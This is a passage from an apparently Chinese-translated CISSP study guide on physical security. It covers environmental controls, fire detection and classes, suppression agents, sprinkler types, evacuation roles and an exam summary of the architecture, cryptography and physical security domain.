  \ 至 27°C (80.6°F)，湿度 25% 至 60%（取决于露点）。较高的设定点需要充足的气流。详情请见 <https://www.ashrae.org/file%20library/technical%20resources/publication%20errata%20and%20updates/2011-gaseous-and-particulate-guidelines.pdf>。\n\
  \n###### 静电与腐蚀\n\n是否曾触摸金属并感到轻微电击？这是由静电积累引起的；低湿度可能导致此类积累。静电会放电以平衡正负电荷失衡：突发的静电放电可能导致从系统重启到芯片或磁盘损坏等各种损害。\n\
  \n通过维持适当湿度、正确接地所有电路，以及使用抗静电喷雾、腕带和工作台面可缓解静电。所有接触敏感计算机设备（如电路板、模块或内存芯片）的人员，在操作前均应给自己接地。\n\
  \n\n\n\n\n高湿度可能导致空气中的水分在设备表面（及内部）凝结，从而引发腐蚀。保持适当的湿度水平可同时缓解静电和腐蚀问题。\n\n###### 空气传播污染物\n\
  \n空气传播污染物对计算机设备构成另一风险。灰尘是常见问题：空气中的灰尘颗粒可能被吸入计算机机箱内并滞留其中。积聚的灰尘会导致过热和静电积累。CPU 风扇可能因灰尘堆积而受阻，进而因过热导致\
  \ CPU 故障。其他污染物可能引起腐蚀或破坏性化学反应。\n\nHVAC 设备（供暖、通风与空调系统）通常在闭环中运行，对循环空气进行处理。正压可防止未经处理的空气进入系统。任何未经处理的空气都应通过\
  \ HEPA（高效颗粒空气）过滤器等过滤器进行污染物过滤。\n\n###### 热探测器、火焰探测器和烟雾探测器\n\n`热探测器`、`火焰探测器` 和 `烟雾探测器`\
  \ 提供了三种火灾探测方法。它们通常在本地报警，也可能由火灾报警系统进行集中监控。除了发出声音警报外，还应使用闪烁灯光，以便听力受损和视力受损人员都能察觉警报。\n\
  \n####### 热探测器\n\n当温度超过既定的安全基线时，热探测器会报警。当超过特定温度，或温度以特定速率变化时（例如“5 分钟内上升 10°F”），它们可能会触发。\n\
  \n####### 烟雾探测器\n\n烟雾探测器通过两种主要方法工作：`电离式` 和 `光电式`。电离式烟雾探测器含有少量放射源，产生微弱电荷。光电传感器工作原理类似，不同之处在于它们包含一个\
  \ LED（发光二极管）和一个光电传感器，在接收光线时产生微弱电荷。当烟雾阻断放射性或光线，降低或阻断电荷时，这两种类型的报警器都会报警。\n\n数据中心应始终避免灰尘。微小的空气传播灰尘颗粒就像烟雾一样触发烟雾探测器，导致误报。\n\
  \n####### 火焰探测器\n\n火焰探测器探测火灾发出的红外线或紫外线。此类探测的一个缺点是，探测器通常需要视线直达才能探测到火焰；烟雾探测器没有这一限制。\n\
  \n###### 人员安全、培训与意识\n\n如前所述，人员安全是物理安全的首要目标。这包括人员在驻场和离场时的安全。安全培训提供技能组合，例如学习操作应急电源系统。安全意识改变用户行为（“刷卡进楼后，不要让任何人跟随你进入大楼”）。安全培训和意识对于确保物理安全计划的成功至关重要。永远不要假设普通人员知道该做什么以及如何做：他们必须接受培训并建立意识。\n\
  \n> **考试警告**\n>\n> 物理安全培训和意识至关重要，因为可能面临的风险极高：人员受伤或生命损失。安全是所有物理安全控制的首要目标。\n\n#######\
  \ 疏散路线\n\n疏散路线应显著张贴，如同在酒店客房中一样。应告知所有人员从其所在区域出发的最快疏散路线。访客也应被告知疏散路线。\n\n所有场所都应设置集合点，所有人员在紧急情况下均在此集合。集合点至关重要：曾发生过悲剧，楼前的人员未意识到楼后还有人员，便重新进入大楼试图营救。\n\
  \n####### 疏散角色与程序\n\n两个主要疏散角色是 `安全监护员` 和 `集合点负责人`。安全监护员确保在紧急情况或演练发生时，所有人员安全撤离大楼。集合点负责人确保在紧急集合点清点所有人员。人员必须遵守应急程序，在紧急情况或演练发生时迅速遵循张贴的疏散路线。\n\
  \n应特别照顾有障碍的人员，其状况可能影响紧急情况下的疏散。例如，火灾期间绝不应使用电梯，这可能阻碍轮椅使用者的疏散。所有场所均应具备缓解控制措施，以确保所有人员安全疏散。\n\
  \n####### 胁迫预警系统\n\n胁迫预警系统旨在紧急情况下（如恶劣天气、暴力威胁、化学污染）向人员提供即时警报。胁迫系统可能是本地的，包含顶置扬声器等技术；也可能使用自动化通信，如电子邮件、即时消息或电话。国家级胁迫安全系统包括美国联邦通信委员会的紧急警报系统（前身为紧急广播系统）。\n\
  \n####### 差旅安全\n\n人员在业务的所有阶段工作时都必须保障安全。这显然包括在驻场执行的工作，也包括授权的居家办公和商务差旅。远程办公人员应配备适当设备，包括符合人体工程学的安全工作站。\n\
  \n前往某些地区的商务差旅可能存在危险。美国国务院领事事务局等组织会发布旅行警告（可在 <https://travel.state.gov/> 查看）；出国前应查阅并遵守此类警告。\n\
  \n###### ABCD 火灾分类与灭火\n\n火灾发生时的首要安全问题是安全疏散。灭火系统用于扑灭火灾，不同类型的火灾需要不同的灭火剂。这些系统通常以人员安全为首要考虑设计。请参阅\
  \ 图 4.38 了解美国使用的火灾分类符号摘要。\n\n![图 4.38 美国火灾分类 [31]。](images/B9780443187346000076/f04-38-9780443187346.jpg)\n\
  \n图 4.38 美国火灾分类 [[31]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0155)。\n\n\
  ######## 火灾等级与灭火剂\n\nA 类火灾涉及木材、纸张等常见可燃物。此类火灾最为常见，应使用水或苏打酸灭火。\n\nB 类火灾涉及燃烧的酒精、油类及汽油等其他石油产品。此类火灾用气体或苏打酸灭火。**切勿**使用水扑灭\
  \ B 类火灾。\n\nC 类火灾是由电力维持的电气火灾，可能发生在设备或线路中。电气火灾是 `C`onductive（导电）火灾，灭火剂必须是非 `C`onductive（导电）的，如各类气体。许多资料错误地将苏打酸列为\
  \ C 类火灾推荐灭火剂：这是不正确的，因为苏打酸会导电。\n\nD 类火灾是金属火灾，用干粉灭火。\n\nK 类火灾是厨房火灾，如燃烧的食用油或油脂。用湿式化学剂扑灭\
  \ K 类火灾。\n\n> **注意**\n>\n> 本节参考美国国家消防协会（NFPA）火灾代码惯例，主要用于美国。其他国家有其他惯例。例如，欧洲体系对 A、B、D\
  \ 类火灾参照美国标准，但将易燃气体归为 C 类，电气火灾归为 E 类，厨房火灾归为 F 类。对比请见 表 4.13。NFPA 官网为 <https://www.nfpa.org>。欧洲火灾分类详见：<https://www.firesafe.org.uk/portable-fire-extinguisher-general/>。\n\
  \n\n\n\n\n######## 火灾等级与灭火剂\n\n| 美国等级 | 欧洲等级 | 材料 | 灭火剂 |\n| --- | --- | --- | ---\
  \ |\n| A | A | 木材、纸张等普通可燃物 | 水或苏打酸 |\n| B | B | 液体 | 卤代烷/卤代烷替代品、CO[2] 或苏打酸 |\n|\
  \ B | C | 易燃气体 | 卤代烷/卤代烷替代品、CO[2] 或苏打酸 |\n| C | E | 电气设备 | 卤代烷/卤代烷替代品、CO[2] |\n\
  | D | D | 可燃金属 | 干粉 |\n| K | F | 厨房（油或脂肪）火灾 | 湿式化学剂 |\n\n### 考试警示\n\nCISSP® 考试是一项国际性考试。务必警惕那些可能因地域不同而答案不同的问题：确保你给出的是该问题的**最佳答案**（而不是你所在地区的答案）。火灾类型的名称就是一个例子；其他还包括法律、公制单位（如米）与美制/英制单位（如码）的区别。\n\
  \n######## 灭火剂类型\n\n在实施灭火系统前，务必查阅当地消防法规。你当地的消防长官是极佳的专家来源：专家总是倾向于预防火灾而非扑灭火灾，且通常会慷慨地投入时间用于预防措施。本文提到的任何经验法则对考试均有效，但在实施任何此类控制措施前，请务必查阅你当地的消防法规。\n\
  \n所有灭火剂均通过以下四种方法（有时组合使用）发挥作用：降低火灾温度、减少氧气供应、减少燃料供应，以及干扰火灾内部的化学反应。\n\n### 考试警示\n\n\
  对于任何询问“最佳做法是什么”的考试问题，始终将“聘请或咨询专家”视为一个有效选项。不要陷入工程师的思维陷阱——“我自己会搞定的”。这种心态可能造就优秀的工程师，但可能导致灾难性的物理安全决策。\n\
  \n在考试中保持对安全的最高标准；最安全的答案往往是最佳答案。这同样适用于合法性、道德性和公平性问题：最合法、最道德、最公平的答案往往是最佳答案。\n\n#########\
  \ 水\n\n水通过将温度降低至 `kindling point`（着火点，也称 `ignition point` 引燃点）以下来抑制火灾。水是所有灭火剂中最安全的，推荐用于扑灭燃烧纸张或木材等普通可燃物火灾。使用水灭火时，切断电源非常重要，以降低触电风险。\n\
  \n######### 苏打酸\n\n还记得那些老式的巨大黄铜灭火器吗？它们大约有消防栓那么大，重量也差不多。它们使用 `soda acid`（苏打酸），这也是它们加压的方式。钢瓶内装有与水混合的苏打（碳酸氢钠），顶部悬挂着一支装有酸的玻璃小瓶。当你想使用灭火器时，会通过杠杆打破小瓶（或拿起灭火器猛砸地面）。这会打破玻璃小瓶，使酸与苏打水混合，产生化学反应生成气体（从而给灭火器加压）。\n\
  \n除了通过降温灭火外，苏打酸还具有普通水所不具备的额外灭火特性：它产生的泡沫能漂浮在某些液体火灾表面，窒息氧气供应。\n\n######### 干粉\n\n\
  使用干粉（如氯化钠）灭火的原理是降低温度和窒息火灾，使其缺氧。干粉主要用于扑灭金属火灾。易燃金属包括钠、镁等。\n\n######### 湿式化学剂\n\n湿式化学剂主要用于扑灭厨房火灾（美国的\
  \ K 类火灾；欧洲的 F 类火灾），但也可用于普通可燃物火灾（A 类）。该化学剂通常是醋酸钾与水的混合物。它用一层肥皂膜覆盖油脂或油火灾，从而降低温度。\n\n\
  ######### CO[2]\n\nCO[2]、氧气和氮气构成了我们呼吸的空气。火灾需要氧气作为燃料，因此移除氧气可窒息火灾：这就是 CO[2] 灭火的工作原理。\n\
  \nCO[2] 相关的风险在于它无色无味，我们的身体会将其当作空气吸入。等到我们因缺氧开始窒息时，往往为时已晚。这使得 CO[2] 成为一种危险的灭火剂，**仅推荐在无人值守区域（如变电站）使用**。进入\
  \ CO[2] 保护区的任何人员都应接受 CO[2] 安全培训；通常还建议配备额外的安全控制措施（如氧气罐）。\n\n### 考试警示\n\n所有环境控制和安全程序必须确保**所有人员**的安全，包括残障人士。例如，火灾期间不能使用电梯，因此坐轮椅的员工必须有补偿性控制措施。\n\
  \n######### 卤代烷及卤代烷替代品\n\n卤代烷通过消耗能量并降低火灾温度的化学反应来灭火。卤代烷已逐步淘汰商业用途，现在使用几种具有相似特性的替代品。\n\
  \n> **注意**\n>\n> 卤代烷及卤代烷替代品的化学作用常被误解：许多人认为它们像 CO[2] 一样通过窒息氧气来灭火。虽然这是卤代烷的次要效果，但该效果相对较小：这些系统的设计初衷是保留足以维持人类生命的氧气含量。\n\
  \n########## 蒙特利尔协议\n\n卤代烷具有破坏臭氧层的特性。鉴于此影响，1989 年的 `Montreal Protocol`（正式名称为“关于消耗臭氧层物质的蒙特利尔议定书”）禁止发达国家在\
  \ 1994 年 1 月 1 日前生产和消费新的卤代烷。现有的卤代烷系统可继续使用。虽然不再生产新的卤代烷，但可使用回收的卤代烷。某些关键用途（如飞机和潜艇）属于例外情况。有关蒙特利尔议定书的更多信息，请访问\
  \ <https://ozone.unep.org>。\n\n从实际角度来看，由于使用年限久远，不再推荐使用卤代烷系统。任何现有的卤代烷系统可能已超过 20 年，极有可能因年久失修而需要更换。替代方案之一是采用类似系统，如氩气或\
  \ FM-200。\n\n########## 卤代烷替代品\n\n推荐的卤代烷替代品包括以下系统：\n\n*   氩气\n*   FE-13\n*   FM-200\n\
  *   Inergen\n\nFE-13 是这些药剂中最新的，且相对安全。其浓度高达 30% 时仍可呼吸。其他卤代烷替代品通常仅在 10%-15% 浓度下安全。\n\
  \n########## 倒计时计时器\n\nCO[2]、卤代烷及卤代烷替代品（如 FM-200）均属于气体灭火系统。所有气体系统在释放气体前均应使用倒计时计时器（兼具可见和可听功能）。这主要是出于安全原因，以便在释放前疏散人员。次要作用是允许人员在误报时停止释放。\n\
  \nCO[2] 高浓度下不可呼吸且致命。虽然卤代烷及卤代烷替代品设计为在正常浓度下可呼吸，但它们仍比水（不含电的情况下）更危险。\n\n> **注意**\n>\n\
  > 水通常是推荐的灭火剂。水（在无电环境下）是对人员最安全的灭火剂。\n\n########## 喷淋系统\n\n所有喷淋系统都应结合火灾报警器，在发生火灾时提醒人员撤离现场。安全疏散是消防安全的首要目标。\n\
  \n########### 湿式管道\n\n\n\n\n\n########### 湿式管道\n\n**湿式管道**的水直接通至喷头：管道内充满了水。喷头内含有一个金属部件（旧式喷头常见）或一个小玻璃球，设计在特定温度下熔化或破裂。一旦发生这种情况，喷头打开，水流喷出。每个喷头会在超过触发温度时独立开启。图\
  \ 4.39 展示了一个玻璃球型喷头。\n\n![图 4.39 玻璃球喷头。](img/f04-39-9780443187346.jpg)\n\n图 4.39\
  \ 玻璃球喷头。\n\n玻璃球有不同的颜色，指示触发玻璃球爆裂并打开喷头的天花板温度。使用的颜色包括橙色（135°F/57°C）、红色（155°F/68°C）、黄色（175°F/79°C）、绿色（200°F/93°C）和蓝色（286°F/141°C）。**NFPA\
  \ 13：喷水灭火系统安装标准**描述了这些喷头使用的颜色惯例。请参见 [`www.nfpa.org/codes-and-standards/all-codes-and-standards/list-of-codes-and-standards/detail?code=13`](https://www.nfpa.org/codes-and-standards/all-codes-and-standards/list-of-codes-and-standards/detail?code=13)。\n\
  \n########## 干式管道\n\n**干式管道**系统也使用闭式喷头：区别在于管道内充满压缩空气。只要管道内保持足够的气压，阀门就会保持关闭以阻挡水流。当干式喷头开启时，管道内气压下降，阀门随之打开并向该喷头供水。\n\
  \n干式管道常用于水可能结冰的区域，例如停车库。\n\n########## 淋喷系统\n\n**淋喷系统**类似于干式管道，不同之处在于喷头是开放的，且比干式管道喷头更大。管道在正常大气压下是空的；一个淋喷阀阻挡水流。当火灾报警器（可能监测烟雾或火焰传感器）触发时，阀门开启。\n\
  \n########## 预作用系统\n\n**预作用**系统是湿式、干式或淋喷系统的组合，需要两个独立的触发条件才能释放水流。单联锁系统在火灾报警触发时将水释放进管道。水在喷头开启后喷出。双联锁系统使用压缩空气（同干式管道）：只有当火灾报警触发**且**喷头开启时，水才会充满管道。\n\
  \n预作用系统用于博物馆等区域，因为意外喷水会造成昂贵损失。双联锁系统用于冷冻库等寒冷区域，以防止管道冻结。\n\n########## 手提灭火器\n\n所有手提灭火器都应标明其设计扑灭的火灾类型。\n\
  \n手提灭火器应足够小巧，以便任何可能需要使用的人员都能操作。这意味着那些老式的黄铜大型灭火器不属于推荐的控制措施。\n\n使用“PASS”法用手提灭火器扑灭火灾：\n\
  \n*   **Pull the pin**（拔掉保险销）\n*   **Aim low**（对准根部/低处瞄准）\n*   **Squeeze the pin**（握压把手/压柄）——\
  \ *注：原文为 \"Squeeze the pin\"，标准 PASS 步骤通常为 \"Squeeze the handle/lever\"（握压把手/压柄）*\n\
  *   **Sweep the fire**（左右扫射火源）\n\n### 考试目标总结\n\n在本（庞大的）领域中，我们首先描述了基本的逻辑硬件、操作系统和软件安全组件，以及如何利用这些组件来设计、架构和评估安全计算机系统。理解这些基本问题对信息安全专业人员至关重要。\n\
  \n随后我们转向密码学，其历史可追溯至古代，但仍深深植根于现代世界，为静态和动态数据提供安全保障。现代系统如**公钥基础设施 (PKI)** 通过使用对称、非对称和基于哈希的加密，将所有密码学组件整合在一起，以提供机密性、完整性、认证和不可抵赖性。你已了解这些组件如何协同工作：速度较慢且强度较弱的非对称密码（如\
  \ **RSA** 和 **Diffie-Hellman**）用于交换速度更快、强度更高的对称密钥（如 **AES** 和 **DES**）。对称密钥作为会话密钥，用于加密短期会话，例如通过\
  \ **HTTPS** 进行的 Web 连接。数字签名采用公钥加密和哈希算法（如 **MD5** 和 **SHA-3**），提供不可抵赖性、发送方认证和消息完整性。理解这些概念及本章讨论的其他概念，并将它们综合应用，对于通过考试至关重要。\n\
  \n最后，物理安全隐含于大多数其他安全控制中，却常被忽视。在实施来自所有 8 个知识领域的控制措施时，我们必须始终寻求平衡。所有资产都应受到跨越多个领域的多层纵深防御控制的保护。例如，文件服务器可通过策略、程序、访问控制、补丁管理、防病毒、操作系统加固、门锁、墙体、暖通空调\
  \ (HVAC) 和灭火系统（以及其他控制）进行保护。应对所有必须受保护的资产进行彻底且准确的风险评估。注意确保没有遗漏或忽视任何领域或控制措施。\n\n###\
